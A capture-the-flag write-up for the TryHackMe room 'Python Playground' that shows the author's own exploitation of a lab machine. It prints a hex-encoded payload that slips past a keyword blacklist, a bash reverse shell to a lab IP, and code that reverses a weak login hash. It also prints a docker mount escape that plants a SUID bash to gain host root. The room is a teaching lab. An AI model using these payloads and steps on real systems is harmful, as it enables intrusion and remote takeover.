---
title: "Python playground"
tags: writeup tryhackme
---

# [tryhackme/pythonplayground](https://tryhackme.com/room/pythonplayground)

## enumeration

A quick nmap scan reveals port 22 and 80 are open
```
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f4:af:2f:f0:42:8a:b5:66:61:3e:73:d8:0d:2e:1c:7f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx7S4TYtpO65Nt0ht3DaAt+X+WFQc/ytjz+/EB+klXHfLlTwTHBbjYoF7Dh3sFV+wc57YarYGvNrq+2mlMPxMzB9iYJrpX/ByeLgxWeKdIizTAUjq3kL9w3gZ3sFchTM1QNdHOiIPAkosueaOcIfa9HLPXc/H8jR/M3abJzmH6lr7wSKUI/E0i+mLDJCXHep5Im8t
/uK+GtfaTdPuJR3TezNAJ64yFil+bE70KbYIj0sY3XxPQ2IM+qwxCKPCMhi1MCL7qyTsZvCEzM0FfxPFZX3fxPKzyzjuSBG/bTU0da2O8Ndox8xS8r/QszCUqvRHK6bsIeoaGKcg5N3OUKvPP
|   256 36:f0:f3:aa:6b:e3:b9:21:c8:88:bd:8d:1c:aa:e2:cd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNOeXRUSHKqlSTLGWSqCdIrgQJUnCMaMUlDoaVxRAdPxKyN24fmEiQwRsh96GPSRBvFqMzyQF7ijTbImcVcNKZY=
|   256 54:7e:3f:a9:17:da:63:f2:a2:ee:5c:60:7d:29:12:55 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILd7Nx4Jn1pD6oKxcr+iZD38mwLVgDSj6pSOzqK4Vl1w
80/tcp open  http    syn-ack Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Python Playground!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![index.html](../../../assets/pythonplayground/index.png)

On the main page a blacklist is mentioned so some header faking with `X-Forwarded-For` was attempted but no luck.

While I was messing around trying to get around a blacklist feroxbuster found `/admin.html`

![feroxscan](../../../assets/pythonplayground/feroxscan.png)

This reveals an admin backend page

![admin](../../../assets/pythonplayground/admin.png)

the javascript on this page is the interesting part here

```javascript
// I suck at server side code, luckily I know how to make things secure without it - Connor

function string_to_int_array(str){
const intArr = [];

for(let i=0;i<str.length;i++){
  const charcode = str.charCodeAt(i);

  const partA = Math.floor(charcode / 26);
  const partB = charcode % 26;

  intArr.push(partA);
  intArr.push(partB);
}

return intArr;
}

function int_array_to_text(int_array){
let txt = '';

for(let i=0;i<int_array.length;i++){
  txt += String.fromCharCode(97 + int_array[i]);
}

return txt;
}

document.forms[0].onsubmit = function (e){
  e.preventDefault();

  if(document.getElementById('username').value !== 'connor'){
    document.getElementById('fail').style.display = '';
    return false;
  }

  const chosenPass = document.getElementById('inputPassword').value;

  const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(chosenPass))));

  if(hash === 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu'){
    window.location = 'super-secret-admin-testing-panel.html';
  }else {
    document.getElementById('fail').style.display = '';
  }
  return false;
}
```

The hash algorithm looks like it is reversible but for now we can go straight to the `super-secret-admin-testing-panel.html`

![testpanel](../../../assets/pythonplayground/testpanel.png)

Here we can actually execute some code, `print('hello')` works as expected but pasting a reverse shell we get denied.

![testpanel blocked](../../../assets/pythonplayground/testpanel-denied.png)

It looks like there is some kind of detection for malicious code. Lets try to get some things past it, firstly import.
Checking my python builtins an alternative to `import os` is `os = __import__('os')`, lo and behold this worked :).
The next step is executing shell commands, however `__import__('os').system('id')` is also blocked. My first assumption
here was system was being filtered, luckily we can use hex strings to get around this. I ended up with this gadget for
executing arbritary system commands.

```python
getattr(__import__('os'), '\x73\x79\x73\x74\x65\x6D')('id')
```

`\x73\x79\x73\x74\x65\x6D` is just `system` hex encoded: if you run `print('\x73\x79\x73\x74\x65\x6D')` it would print `system`.

We can now pop a reverse shell, I used this one (adapted from [revshells](https://revshells.com))

```shell
$ bash -c "bash -i >& /dev/tcp/10.9.176.139/1337 0>&1"
```

On this system we find the first flag (`/root/flag1.txt`) however it seems to be a docker container, and because we are already root I doubt there are any more flags here.
It's time to try getting into the ssh. 

Now we have our shell we can check what blacklist they were using by dumping the source code in `/root/app/index.js`.
```javascript
function isAllowed(code){
    if(typeof code !== 'string'){
        return false;
    }
    if(code.indexOf('import ') >= 0){
        return false;
    }
    if(code.indexOf('eval') >= 0){
        return false;
    }
    if(code.indexOf('.system') >= 0){
        return false;
    }
    if(code.indexOf('exec') >= 0){
        return false;
    }

    return true;
}
```

It was just a simple word filter, nice.

## Finding connor's password
By reverse engineering connor's "secure" hash algorithm I came up with this javascript code to reverse it. Each function
is essentially the inverse of what was in the original javascript.
```javascript
const hash = 'dxeedxebdwemdwesdxdtdweqdxefdxefdxdudueqduerdvdtdvdu';

function string_to_int(string) {
  const arr = [];
  for (let i=0;i<string.length;i++) {
    arr.push(string.charCodeAt(i)-97);
  }
  return arr;
}

function int_to_string(ints) {
  let string = '';
  for (let i=0;i<ints.length;i+=2) {
    string += String.fromCharCode((ints[i]*26) + ints[i+1]);
  }
  return string;
}

console.log(int_to_string(string_to_int(int_to_string(string_to_int(hash)))));
```

Using this I found connor's password and was able to login to ssh retrieving the second flag (`/home/connor/flag2.txt`).

## Getting root
Now we can ssh into the host machine it's a fair guess the final flag is the host's root user. Getting there was a bit of
a guessing game. The usually evaluation yields no results.

- `sudo -l`: not allowed
- `find / -perm /6000 2>/dev/null`: only common binaries
- `linpeas.sh`: no real results a few possibilities for vulnerable versions of `sudo` and `pkexec` but they didn't work

We know the system has docker but we don't have permission to control it as connor. Luckily after messing around with
docker commands I remembered some recon I did on the first reverse shell.

If we go back the original reverse shell into the docker container and run
```shell
# mount -l
```

![docker mounts](../../../assets/pythonplayground/docker-mounts.png)

A few of these mounts are sus docker bindings, after doing some investigating `/mnt/log` looks like it is `/var/log` on
the host system, this is very good.

Testing this theory we can create a file here on our reverse shell
```shell
# cd /mnt/log
# touch test
```

And then if we view the directory from our ssh session we can see the newly created file :).

Exploiting this is not too hard, as we are root in the docker container we can do root things to the files in this directory.
First I made a folder for connor to copy into
```shell
# mkdir hak
# chmod 777 hak
# cd hak
```

Then in our ssh shell we can copy the local copy of bash here (we need the local copy as the docker containers copy is copiled
with different dynamic links).
```shell
$ cp /bin/bash /var/log/hak
```

Now back in the docker container we can make this a SUID binary.
```shell
# chown root:root bash
# chmod +xs bash
```

Now we've made our own SUID binary and can exploit to get root on the host!

![escalate](../../../assets/pythonplayground/escalate.png)
